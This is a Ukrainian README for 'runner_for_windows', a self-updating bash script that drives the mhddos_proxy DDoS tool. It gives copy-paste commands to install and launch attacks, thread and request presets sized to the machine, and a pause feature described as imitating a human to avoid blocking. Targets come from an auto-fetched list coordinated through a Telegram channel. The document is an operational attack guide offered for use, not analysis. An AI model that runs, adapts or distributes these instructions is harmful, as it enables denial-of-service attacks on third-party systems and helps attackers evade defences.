# Опис runner_for_windows
  
[**Варіант для Linux**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/main)  
[**Варіант для Docker**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker)    
  
можете запускати цей скрипт на увесь день та йти по своїм справам (але перед тим ОБОВ'ЯЗКОВО встановіть VPN, який ніколи не відключиться сам: https://auto-ddos.notion.site/Cyberghost-f72074a09b224851b2058d559c0b2691 )  

**якщо запускаєте цей скрипт - інші атаки через Python не запускайте, бо при рестарті він вбиває усі процеси з Python (щоб старі атаки не накопичувалися)**
  
[**Налаштування**](https://github.com/alexnest-ua/runner_for_windows#%D0%BD%D0%B0%D0%BB%D0%B0%D1%88%D1%82%D1%83%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B2%D1%81%D1%82%D0%B0%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F)  
[**Запуск атаки**](https://github.com/alexnest-ua/runner_for_windows#%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8)  
[**Приклад команд**](https://github.com/alexnest-ua/runner_for_windows#%D0%BF%D1%80%D0%B8%D0%BA%D0%BB%D0%B0%D0%B4%D0%B8-%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4-%D0%B7-%D1%80%D1%96%D0%B7%D0%BD%D0%B8%D0%BC%D0%B8-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D0%B0%D0%BC%D0%B8)  

runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Linux-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)  
Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy: https://github.com/alexnest-ua/runner_for_windows/blob/428dac4faff4596a4db2b28a28caae3a32c412ee/runner.sh#L50
Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-4 (рандомно) хвилин), тому знижується можливість блокування:  
https://github.com/alexnest-ua/runner_for_windows/blob/31ce1eed1adbf91e356a8e5912d872ef96f6f869/runner.sh#L148
Скрипт розподіляє список машин по різним цілям: https://github.com/alexnest-ua/targets/blob/main/targets_linux  

  
Канал, де координуються цілі: https://t.me/ddos_separ (звідти і беруться сюди цілі, тому якщо у вас на Linux запущено цей скрипт - то можете відповчивати, він все зробить за вас)  
чат де ви можете задати свої питання: https://t.me/+8swDHSe_ROI5MmJi  
також можете писати мені в особисті у телеграм, я завжди усім відповідаю: @brainqdead
  
Туторіал по створенню автоматичних та автономних Linux-серверів: https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c  

## Налаштування (встановлення)
  
* щоб скачати на Windows-машину:  
йдемо сюди: https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-komp-03-27  
та пророблюємо 1 та 2 пункт (якщо раніше не зробили)  

після останнього пункту (встановлення Git) відкриваємо Git Bash:  
![image](https://user-images.githubusercontent.com/74729549/163037827-88e246e2-2187-4768-a7a1-4afec1d78e83.png)  
відкриється наступне вікно:  
![image](https://user-images.githubusercontent.com/74729549/163038391-896d66ef-ceeb-42b4-aa92-53b68abb59f1.png)

Далі просто почерзі вводимо наступні команди, та натискаємо Enter: 

```shell
cd ~
rm -rf runner_for_windows
git clone https://github.com/alexnest-ua/runner_for_windows.git
cd ~/runner_for_windows
bash setup.sh
```  
можливі наступні повідомлення:  
![image](https://user-images.githubusercontent.com/74729549/163044158-65de0a4f-9f37-4581-8c81-1a4275f95fc4.png)  
просто пишіть y та тисніть Enter (або якщо їх немає - нічого не робіть)  

чекаємо поки усе встановиться (на Warning не звертаємо уваги)  

## Запуск атаки:  
**ПРИ РЕСТАРТІ АТАКИ / КОМП'ЮТЕРА СПЕРШУ ОБОВ'ЯЗКОВО ПОТРІБНО ВІДКРИТИ САМЕ Git Bash**
```shell
cd ~/runner_for_windows
bash runner.sh
```
**Далі можна просто ЗГОРНУТИ вікно і воно буде працювати нескінченно в фоні**
***щоб зупинити - у відкритому вікні з атакою - натискайте Ctrl+C***

**!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 3)), але можно і без них:  
runner.sh [num_of_copies] [threads] [rpc] [debug]  
- num_of_copies - кількість атакуємих за один прохід цілей
- threads - кількість потоків на кожне ядро процесора
- rpc - кількість запитів на проксі перед відправкою на ціль
- debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
  
### Приклади команд з різними параметрами:
перед уведенням команд обов'язково треба відкрити Git Bash та зробити ось це:
```shell
cd ~/runner_for_windows
```
1. ***Для лінивих*** (буде обрано за замовчуванням: num_of_copies=1, threads=1500 rpc=1000 debug="" (1 ціль, 1500 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу)
```shell
bash runner.sh 
```
  
**CPUs** - це ядра вашого процесора - зазвичай ядер у два рази менше ніж потоків 
  
2. Слаба машина(1 CPU + 1-2 GB RAM), саме ці параметри за замовчуванням:
```shell
bash runner.sh 1 1500 1000
```

3. Середня машина(2-4 CPUs + 2-8 GB RAM):
```shell
bash runner.sh 1 3000 2000
```

4. Нормальна машина(4-8 CPUs + 8-16 GB RAM):
```shell
bash runner.sh 2 5000 2000
```

5. Потужна машина(9+ CPUs + 16+ GB RAM):
```shell
bash runner.sh all 5000 2000
```

  
*також ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ці.*  
*також можете додавати останнім **4-тим** параметром --debug, що слідкувати за ходом атаки, наприклад:*  
```shell
bash runner.sh 1 1500 1000 --debug
```
  
* Приклад БЕЗ параметру --debug:
![image](https://user-images.githubusercontent.com/74729549/163039792-0ee47ef5-9cc0-4948-95b8-0eacd7acc0fd.png)  
І після цього наступні 300 секунд НІЧОГО не буде виводитись, але це нормально
* Приклад З параметром --debug:
![image](https://user-images.githubusercontent.com/74729549/163039933-61d4f19f-fd55-4a24-9f2e-66557f321636.png)  
  
Далі кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки


* щоб Вбити процес - відкривайте вікно не він запущений та натискайте Ctrl+C:  

УВАГА!!! Скрипт при рестарті (кожні 20 хвилин) вбиває запущені скрипти саме з mhddos_proxy, тому якщо запускаєте цей скрипт на Windows-машині, то свої атаки mhddos_proxy запускайте лише через docker, а краще на іншій машині [напряму](https://t.me/ddos_separ/990)  


## Список цілей  

  
runner.sh підтримує единий [список цілей](https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux), який можна тримати на github і постійно оновлювати.  
  
  
  
Цілі не обов'язково видаляти із списку. Їх можна просто закоментувати і розкоментувати пізніше, якщо вони знов знадобляться. Скрипт використовує лише строки, які починаються не на #.  
